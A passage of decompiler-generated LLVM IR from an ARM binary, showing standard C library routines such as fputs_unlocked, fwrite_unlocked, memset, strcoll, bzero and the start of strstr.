  store i32 %v1_11944, i32* %r6.global-to-local, align 4
  %v2_11944 = icmp ne i32 %v0_11944, 0
  store i1 %v2_11944, i1* %cpsr_c.global-to-local, align 1
  %v7_11944 = icmp eq i32 %v0_11944, 1
  store i1 %v7_11944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11944, label %dec_label_pc_1194c, label %dec_label_pc_11944.backedge.dec_label_pc_118f0_crit_edge

dec_label_pc_11944.backedge.dec_label_pc_118f0_crit_edge: ; preds = %dec_label_pc_11944.backedge
  %v0_118f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_118f0

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11940, %dec_label_pc_11944.backedge, %dec_label_pc_11900, %dec_label_pc_11944.preheader, %dec_label_pc_11928
  %v0_1194c = load i32, i32* @r5, align 4
  %v1_1194c = load i32, i32* @r7, align 4
  %v3_1194c = icmp uge i32 %v0_1194c, %v1_1194c
  store i1 %v3_1194c, i1* %cpsr_c.global-to-local, align 1
  %v9_1194c = icmp eq i32 %v0_1194c, %v1_1194c
  store i1 %v9_1194c, i1* %cpsr_z.global-to-local, align 1
  %v2_11950 = xor i1 %v9_1194c, true
  %v3_11950 = and i1 %v3_1194c, %v2_11950
  br i1 %v3_11950, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1194c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_11954 = inttoptr i32 %v0_1194c to i8*
  store i8 0, i8* %v7_11954, align 1
  %v0_11958.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11958.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1194c, %bb
  %v1_11958 = phi i1 [ %v1_11958.pre, %bb ], [ %v9_1194c, %dec_label_pc_1194c ]
  %v0_11958 = phi i1 [ %v0_11958.pre, %bb ], [ %v3_1194c, %dec_label_pc_1194c ]
  %v2_11958 = xor i1 %v1_11958, true
  %v3_11958 = and i1 %v0_11958, %v2_11958
  br i1 %v3_11958, label %.dec_label_pc_11960_crit_edge, label %dec_label_pc_1195c

.dec_label_pc_11960_crit_edge:                    ; preds = %.thread14
  %v0_11960.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11960

dec_label_pc_1195c:                               ; preds = %entry, %dec_label_pc_11928, %.thread14
  br label %dec_label_pc_11960

dec_label_pc_11960:                               ; preds = %.dec_label_pc_11960_crit_edge, %dec_label_pc_1195c
  %v0_11960 = phi i32 [ %v0_11960.pre, %.dec_label_pc_11960_crit_edge ], [ 0, %dec_label_pc_1195c ]
  store i32 %v6_118d0, i32* @r5, align 4
  ret i32 %v0_11960

; uselistorder directives
  uselistorder i1 %v9_1194c, { 1, 0, 2 }
  uselistorder i32 %v1_1194c, { 1, 0 }
  uselistorder i32 %v0_1194c, { 0, 2, 1 }
  uselistorder i32 %v0_11944, { 2, 0, 1 }
  uselistorder i32 %v0_1193c, { 1, 0 }
  uselistorder i32 %v3_11918, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11908, { 1, 0 }
  uselistorder i32 %v3_118f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_11914, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_11960, { 1, 0 }
  uselistorder label %dec_label_pc_1195c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1194c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_118f0, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11970 = load i32, i32* @r4, align 4
  store i32 %v3_11970, i32* %stack_var_-16, align 4
  %v6_11970 = load i32, i32* @r5, align 4
  %v9_11970 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1197c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1197c, i32* @r6, align 4
  %v0_11984 = load i32, i32* @r5, align 4
  %v0_11988 = load i32, i32* @r4, align 4
  %v5_11994 = inttoptr i32 %v0_11984 to i16*
  %v6_11994 = call i32 @__GI_fwrite_unlocked(i32 %v0_11988, i32 1, i32 %v3_1197c, i16* %v5_11994)
  %v1_11998 = load i32, i32* @r6, align 4
  %v9_11998 = icmp eq i32 %v6_11994, %v1_11998
  br i1 %v9_11998, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_119a4 = phi i32 [ %v6_11994, %entry ], [ -1, %bb ]
  %v2_119a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_119a0, i32* @r4, align 4
  store i32 %v6_11970, i32* @r5, align 4
  store i32 %v9_11970, i32* @r6, align 4
  ret i32 %v1_119a4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_119a8 = load i32, i32* @r6, align 4
  %v12_119a8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_119b0 = load i16, i16* %arg4, align 2
  %v1_119b4 = and i16 %v3_119b0, 192
  %v2_119b8 = icmp eq i16 %v1_119b4, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_119b8, label %dec_label_pc_119e4, label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %entry
  %v4_119d8 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_119dc = icmp eq i32 %v4_119d8, 0
  br i1 %v2_119dc, label %dec_label_pc_119e4thread-pre-split, label %dec_label_pc_11a44

dec_label_pc_119e4thread-pre-split:               ; preds = %dec_label_pc_119d0
  %v0_119e4.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_119e4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119e4thread-pre-split, %entry
  %v0_11a08 = phi i32 [ %v0_119e4.pr, %dec_label_pc_119e4thread-pre-split ], [ %arg2, %entry ]
  %v2_119e4 = icmp eq i32 %v0_11a08, 0
  br i1 %v2_119e4, label %dec_label_pc_11a44, label %bb

bb:                                               ; preds = %dec_label_pc_119e4
  %v1_119e8 = load i32, i32* @r6, align 4
  %v3_119e8 = icmp eq i32 %v1_119e8, 0
  br i1 %v3_119e8, label %dec_label_pc_11a44, label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %bb
  %v2_119f8 = udiv i32 -1, %v0_11a08
  %tmp9 = icmp ugt i32 %v1_119e8, %v2_119f8
  %v0_11a24 = load i32, i32* @r5, align 4
  %v1_11a24 = inttoptr i32 %v0_11a24 to i16*
  br i1 %tmp9, label %dec_label_pc_11a24, label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119f0
  store i32 %v0_11a24, i32* %r2.global-to-local, align 4
  %v2_11a08 = mul i32 %v1_119e8, %v0_11a08
  %v0_11a0c = load i32, i32* @r7, align 4
  %v5_11a10 = call i32 @__stdio_fwrite(i32 %v0_11a0c, i32 %v2_11a08, i16* %v1_11a24)
  %v0_11a14 = load i32, i32* @r4, align 4
  %v2_11a18 = udiv i32 %v5_11a10, %v0_11a14
  store i32 %v2_11a18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a48

dec_label_pc_11a24:                               ; preds = %dec_label_pc_119f0
  %v2_11a24 = load i16, i16* %v1_11a24, align 2
  %v1_11a28 = or i16 %v2_11a24, 8
  store i16 %v1_11a28, i16* %v1_11a24, align 2
  %v0_11a30 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11a3c = inttoptr i32 %v0_11a30 to i32*
  store i32 22, i32* %v2_11a3c, align 4
  %v0_11a48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a48

dec_label_pc_11a44:                               ; preds = %dec_label_pc_119e4, %dec_label_pc_119d0, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a48

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a24, %dec_label_pc_11a04, %dec_label_pc_11a44
  %v0_11a48 = phi i32 [ %v0_11a48.pre, %dec_label_pc_11a24 ], [ %v2_11a18, %dec_label_pc_11a04 ], [ 0, %dec_label_pc_11a44 ]
  store i32 %v9_119a8, i32* @r6, align 4
  store i32 %v12_119a8, i32* @r7, align 4
  ret i32 %v0_11a48

; uselistorder directives
  uselistorder i16* %v1_11a24, { 0, 2, 1 }
  uselistorder i32 %v1_119e8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11a48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a44, { 2, 0, 1 }
}

define i32 @function_11a58(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a58:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11a64 = load i32, i32* @r2, align 4
  %v8_11a64 = icmp eq i32 %v0_11a64, 8
  store i1 %v8_11a64, i1* %cpsr_z.global-to-local, align 1
  %v5_11a68 = icmp slt i32 %v0_11a64, 8
  br i1 %v5_11a68, label %dec_label_pc_11ac8, label %dec_label_pc_11a6c

dec_label_pc_11a6c:                               ; preds = %entry
  %v4_11a6c = mul i32 %arg2, 256
  %v5_11a6c = or i32 %v4_11a6c, %arg2
  %v4_11a70 = mul i32 %v5_11a6c, 65536
  %v5_11a70 = or i32 %v4_11a70, %v5_11a6c
  store i32 %v5_11a70, i32* %r1.global-to-local, align 4
  %v1_11a7457 = urem i32 %tmp, 4
  %v2_11a7458 = icmp eq i32 %v1_11a7457, 0
  store i1 %v2_11a7458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11a7458, label %dec_label_pc_11a84, label %bb

bb:                                               ; preds = %dec_label_pc_11a6c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11a6c ]
  %v3_11a7859 = phi i32 [ %v6_11a78, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11a6c ]
  %v4_11a78 = inttoptr i32 %v3_11a7859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11a78, align 1
  %v5_11a78 = load i32, i32* @r3, align 4
  %v6_11a78 = add i32 %v5_11a78, 1
  store i32 %v6_11a78, i32* @r3, align 4
  %v0_11a7c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11a88.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_11a7c.pr, label %dec_label_pc_11a84, label %.thread

.thread:                                          ; preds = %bb
  %v2_11a7c = add i32 %v0_11a88.pr.pre, -1
  store i32 %v2_11a7c, i32* @r2, align 4
  %v1_11a74 = urem i32 %v6_11a78, 4
  %v2_11a74 = icmp eq i32 %v1_11a74, 0
  store i1 %v2_11a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a74, label %dec_label_pc_11a84, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11a78.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11a78.pre to i8
  br label %bb

dec_label_pc_11a84:                               ; preds = %.thread, %bb, %dec_label_pc_11a6c
  %v0_11a9028 = phi i32 [ %tmp, %dec_label_pc_11a6c ], [ %v6_11a78, %bb ], [ %v6_11a78, %.thread ]
  %v0_11a88.pr = phi i32 [ %v0_11a64, %dec_label_pc_11a6c ], [ %v0_11a88.pr.pre, %bb ], [ %v2_11a7c, %.thread ]
  %v0_11a84 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11a84, i32* @ip, align 4
  %v8_11a8810 = icmp eq i32 %v0_11a88.pr, 8
  store i1 %v8_11a8810, i1* %cpsr_z.global-to-local, align 1
  %v5_11a8c11 = icmp slt i32 %v0_11a88.pr, 8
  br i1 %v5_11a8c11, label %dec_label_pc_11ac8, label %dec_label_pc_11a90.preheader

dec_label_pc_11a90.preheader:                     ; preds = %dec_label_pc_11a84
  %v1_11a9046 = inttoptr i32 %v0_11a9028 to i32*
  store i32 %v0_11a84, i32* %v1_11a9046, align 4
  %v3_11a9047 = add i32 %v0_11a9028, 4
  %v4_11a9048 = inttoptr i32 %v3_11a9047 to i32*
  %v5_11a9049 = load i32, i32* @ip, align 4
  store i32 %v5_11a9049, i32* %v4_11a9048, align 4
  %v6_11a9050 = add i32 %v0_11a9028, 8
  store i32 %v6_11a9050, i32* @r3, align 4
  %v0_11a9451 = load i32, i32* @r2, align 4
  %v1_11a9452 = add i32 %v0_11a9451, -8
  store i32 %v1_11a9452, i32* %r2.global-to-local, align 4
  %v5_11a9c53 = icmp slt i32 %v1_11a9452, 8
  br i1 %v5_11a9c53, label %dec_label_pc_11a90.dec_label_pc_11ac8.loopexit_crit_edge, label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a90.preheader, %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge
  %v6_11a9055 = phi i32 [ %v6_11a90, %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge ], [ %v6_11a9050, %dec_label_pc_11a90.preheader ]
  %v0_11a9054 = phi i32 [ %v12_11abc, %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge ], [ %v0_11a9028, %dec_label_pc_11a90.preheader ]
  %v1_11aa0 = inttoptr i32 %v6_11a9055 to i32*
  %v2_11aa0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11aa0, i32* %v1_11aa0, align 4
  %v3_11aa0 = add i32 %v0_11a9054, 12
  %v4_11aa0 = inttoptr i32 %v3_11aa0 to i32*
  %v5_11aa0 = load i32, i32* @ip, align 4
  store i32 %v5_11aa0, i32* %v4_11aa0, align 4
  %v6_11aa0 = add i32 %v0_11a9054, 16
  store i32 %v6_11aa0, i32* @r3, align 4
  %v0_11aa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11aa4 = add i32 %v0_11aa4, -8
  store i32 %v1_11aa4, i32* %r2.global-to-local, align 4
  %v5_11aac = icmp slt i32 %v1_11aa4, 8
  br i1 %v5_11aac, label %dec_label_pc_11aa0.dec_label_pc_11ac8.loopexit_crit_edge, label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11aa0
  %v1_11ab0 = inttoptr i32 %v6_11aa0 to i32*
  %v2_11ab0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11ab0, i32* %v1_11ab0, align 4
  %v3_11ab0 = add i32 %v0_11a9054, 20
  %v4_11ab0 = inttoptr i32 %v3_11ab0 to i32*
  %v5_11ab0 = load i32, i32* @ip, align 4
  store i32 %v5_11ab0, i32* %v4_11ab0, align 4
  %v6_11ab0 = add i32 %v0_11a9054, 24
  store i32 %v6_11ab0, i32* @r3, align 4
  %v0_11ab4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ab4 = add i32 %v0_11ab4, -8
  store i32 %v1_11ab4, i32* %r2.global-to-local, align 4
  %v5_11abc = icmp slt i32 %v1_11ab4, 8
  br i1 %v5_11abc, label %dec_label_pc_11ab0.dec_label_pc_11ac8.loopexit_crit_edge, label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11ab0
  %v7_11abc = inttoptr i32 %v6_11ab0 to i32*
  %v8_11abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_11abc, i32* %v7_11abc, align 4
  %v9_11abc = add i32 %v0_11a9054, 28
  %v10_11abc = inttoptr i32 %v9_11abc to i32*
  %v11_11abc = load i32, i32* @ip, align 4
  store i32 %v11_11abc, i32* %v10_11abc, align 4
  %v12_11abc = add i32 %v0_11a9054, 32
  store i32 %v12_11abc, i32* @r3, align 4
  %v6_11ac0 = load i32, i32* %r2.global-to-local, align 4
  %v7_11ac0 = add i32 %v6_11ac0, -8
  store i32 %v7_11ac0, i32* %r2.global-to-local, align 4
  %v5_11a8c = icmp slt i32 %v7_11ac0, 8
  br i1 %v5_11a8c, label %dec_label_pc_11a88.dec_label_pc_11ac8.loopexit_crit_edge, label %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge

dec_label_pc_11a88.dec_label_pc_11a90_crit_edge:  ; preds = %dec_label_pc_11a88
  %v2_11a90.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11a90 = inttoptr i32 %v12_11abc to i32*
  store i32 %v2_11a90.pre, i32* %v1_11a90, align 4
  %v3_11a90 = add i32 %v0_11a9054, 36
  %v4_11a90 = inttoptr i32 %v3_11a90 to i32*
  %v5_11a90 = load i32, i32* @ip, align 4
  store i32 %v5_11a90, i32* %v4_11a90, align 4
  %v6_11a90 = add i32 %v0_11a9054, 40
  store i32 %v6_11a90, i32* @r3, align 4
  %v0_11a94 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a94 = add i32 %v0_11a94, -8
  store i32 %v1_11a94, i32* %r2.global-to-local, align 4
  %v5_11a9c = icmp slt i32 %v1_11a94, 8
  br i1 %v5_11a9c, label %dec_label_pc_11a90.dec_label_pc_11ac8.loopexit_crit_edge, label %dec_label_pc_11aa0

dec_label_pc_11a88.dec_label_pc_11ac8.loopexit_crit_edge: ; preds = %dec_label_pc_11a88
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ac8

dec_label_pc_11a90.dec_label_pc_11ac8.loopexit_crit_edge: ; preds = %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge, %dec_label_pc_11a90.preheader
  %v1_11a94.lcssa = phi i32 [ %v1_11a9452, %dec_label_pc_11a90.preheader ], [ %v1_11a94, %dec_label_pc_11a88.dec_label_pc_11a90_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ac8

dec_label_pc_11aa0.dec_label_pc_11ac8.loopexit_crit_edge: ; preds = %dec_label_pc_11aa0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ac8

dec_label_pc_11ab0.dec_label_pc_11ac8.loopexit_crit_edge: ; preds = %dec_label_pc_11ab0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11a84, %dec_label_pc_11a88.dec_label_pc_11ac8.loopexit_crit_edge, %dec_label_pc_11a90.dec_label_pc_11ac8.loopexit_crit_edge, %dec_label_pc_11aa0.dec_label_pc_11ac8.loopexit_crit_edge, %dec_label_pc_11ab0.dec_label_pc_11ac8.loopexit_crit_edge, %entry
  %v0_11ad0 = phi i32 [ %v0_11a64, %entry ], [ %v1_11ab4, %dec_label_pc_11ab0.dec_label_pc_11ac8.loopexit_crit_edge ], [ %v1_11aa4, %dec_label_pc_11aa0.dec_label_pc_11ac8.loopexit_crit_edge ], [ %v1_11a94.lcssa, %dec_label_pc_11a90.dec_label_pc_11ac8.loopexit_crit_edge ], [ %v7_11ac0, %dec_label_pc_11a88.dec_label_pc_11ac8.loopexit_crit_edge ], [ %v0_11a88.pr, %dec_label_pc_11a84 ]
  %v2_11ac8 = icmp eq i32 %v0_11ad0, 0
  store i1 %v2_11ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ac8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11ac8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11ac8
  %v1_11ad0 = sub i32 7, %v0_11ad0
  store i32 %v1_11ad0, i32* %r2.global-to-local, align 4
  %v3_11ad4 = mul i32 %v1_11ad0, 4
  %v4_11ad4 = add i32 %v3_11ad4, ptrtoint (i32* @global_var_11adc.686 to i32)
  call void @__pseudo_branch(i32 %v4_11ad4)
  %v0_11adc = load i32, i32* %r1.global-to-local, align 4
  %v1_11adc = trunc i32 %v0_11adc to i8
  %v2_11adc = load i32, i32* @r3, align 4
  %v3_11adc = inttoptr i32 %v2_11adc to i8*
  store i8 %v1_11adc, i8* %v3_11adc, align 1
  %v4_11adc = load i32, i32* @r3, align 4
  %v5_11adc = add i32 %v4_11adc, 1
  store i32 %v5_11adc, i32* %r3.global-to-local, align 4
  %v0_11ae0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ae0 = trunc i32 %v0_11ae0 to i8
  %v3_11ae0 = inttoptr i32 %v5_11adc to i8*
  store i8 %v1_11ae0, i8* %v3_11ae0, align 1
  %v4_11ae0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ae0 = add i32 %v4_11ae0, 1
  store i32 %v5_11ae0, i32* %r3.global-to-local, align 4
  %v0_11ae4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ae4 = trunc i32 %v0_11ae4 to i8
  %v3_11ae4 = inttoptr i32 %v5_11ae0 to i8*
  store i8 %v1_11ae4, i8* %v3_11ae4, align 1
  %v4_11ae4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ae4 = add i32 %v4_11ae4, 1
  store i32 %v5_11ae4, i32* %r3.global-to-local, align 4
  %v0_11ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ae8 = trunc i32 %v0_11ae8 to i8
  %v3_11ae8 = inttoptr i32 %v5_11ae4 to i8*
  store i8 %v1_11ae8, i8* %v3_11ae8, align 1
  %v4_11ae8 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ae8 = add i32 %v4_11ae8, 1
  store i32 %v5_11ae8, i32* %r3.global-to-local, align 4
  %v0_11aec = load i32, i32* %r1.global-to-local, align 4
  %v1_11aec = trunc i32 %v0_11aec to i8
  %v3_11aec = inttoptr i32 %v5_11ae8 to i8*
  store i8 %v1_11aec, i8* %v3_11aec, align 1
  %v4_11aec = load i32, i32* %r3.global-to-local, align 4
  %v5_11aec = add i32 %v4_11aec, 1
  store i32 %v5_11aec, i32* %r3.global-to-local, align 4
  %v0_11af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11af0 = trunc i32 %v0_11af0 to i8
  %v3_11af0 = inttoptr i32 %v5_11aec to i8*
  store i8 %v1_11af0, i8* %v3_11af0, align 1
  %v4_11af0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11af0 = add i32 %v4_11af0, 1
  store i32 %v5_11af0, i32* %r3.global-to-local, align 4
  %v0_11af4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11af4 = trunc i32 %v0_11af4 to i8
  %v3_11af4 = inttoptr i32 %v5_11af0 to i8*
  store i8 %v1_11af4, i8* %v3_11af4, align 1
  %v4_11af4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11af4 = add i32 %v4_11af4, 1
  store i32 %v5_11af4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11a90, { 1, 0 }
  uselistorder i32 %v12_11abc, { 1, 2, 0 }
  uselistorder i32 %v0_11a9054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11a88.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11a78, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11a6c, { 1, 0 }
  uselistorder i32 %v0_11a64, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11ac8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11aa0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_11b6c = inttoptr i32 %arg2 to i8*
  %v3_11b6c = call i32 @_memcpy(i8* %v2_11b6c, i32 %arg1)
  ret i32 %v3_11b6c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11b74.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11b74 = phi i32 [ %v0_11b74.pre, %bb ], [ %v5_11b74, %bb3 ]
  %v0_11b70 = phi i32 [ %tmp, %bb ], [ %v5_11b70, %bb3 ]
  %v1_11b70 = inttoptr i32 %v0_11b70 to i8*
  %v2_11b70 = load i8, i8* %v1_11b70, align 1
  %v3_11b70 = zext i8 %v2_11b70 to i32
  store i32 %v3_11b70, i32* @r2, align 4
  %v1_11b74 = inttoptr i32 %v0_11b74 to i8*
  %v2_11b74 = load i8, i8* %v1_11b74, align 1
  %v3_11b74 = zext i8 %v2_11b74 to i32
  %v2_11b78 = icmp eq i8 %v2_11b70, 0
  br i1 %v2_11b78, label %.dec_label_pc_11b84_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11b74 = add i32 %v0_11b74, 1
  %v5_11b70 = add i32 %v0_11b70, 1
  %v10_11b7c = icmp eq i8 %v2_11b70, %v2_11b74
  br i1 %v10_11b7c, label %entry, label %dec_label_pc_11b84

.dec_label_pc_11b84_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11b84

dec_label_pc_11b84:                               ; preds = %bb3, %.dec_label_pc_11b84_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11b84_crit_edge ], [ %v3_11b70, %bb3 ]
  %v2_11b84.pre-phi = sub nsw i32 %.pn, %v3_11b74
  ret i32 %v2_11b84.pre-phi

; uselistorder directives
  uselistorder i32 %v0_11b70, { 1, 0 }
  uselistorder i32 %v0_11b74, { 1, 0 }
  uselistorder label %dec_label_pc_11b84, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11b90 = load i32, i32* @r0, align 4
  %v1_11b90 = load i32, i32* @r1, align 4
  %v2_11b90 = inttoptr i32 %v0_11b90 to i8*
  %v3_11b90 = call i32 @_memcpy(i8* %v2_11b90, i32 %v1_11b90)
  ret i32 %v3_11b90
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_11ba8 = load i32, i32* @r0, align 4
  %v2_11ba8 = inttoptr i32 %v0_11ba8 to i8*
  %v3_11ba8 = call i32 @__GI_memset(i8* %v2_11ba8, i32 0)
  ret i32 %v3_11ba8
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_11bb4 = load i8, i8* %arg2, align 1
  %v2_11bb8 = icmp eq i8 %v3_11bb4, 0
  %v1_11ca8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_11bb8, label %dec_label_pc_11ca4, label %dec_label_pc_11bc0

dec_label_pc_11bc0:                               ; preds = %entry
  %v1_11bc0 = add i32 %v1_11ca8.pre, -1
  store i32 %v1_11bc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bd0, %dec_label_pc_11bc0
  %v0_11bc4 = phi i32 [ %v1_11bc4, %dec_label_pc_11bd0 ], [ %v1_11bc0, %dec_label_pc_11bc0 ]
  %v1_11bc4 = add i32 %v0_11bc4, 1
  %v2_11bc4 = inttoptr i32 %v1_11bc4 to i8*
  %v3_11bc4 = load i8, i8* %v2_11bc4, align 1
  store i32 %v1_11bc4, i32* %r0.global-to-local, align 4
  %v2_11bc8 = icmp eq i8 %v3_11bc4, 0
  br i1 %v2_11bc8, label %dec_label_pc_11ca0, label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11bc4
  %v9_11bd0 = icmp eq i8 %v3_11bc4, %v3_11bb4
  br i1 %v9_11bd0, label %dec_label_pc_11bd8, label %dec_label_pc_11bc4

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bd0
  %v2_11bd8 = add i32 %tmp, 1
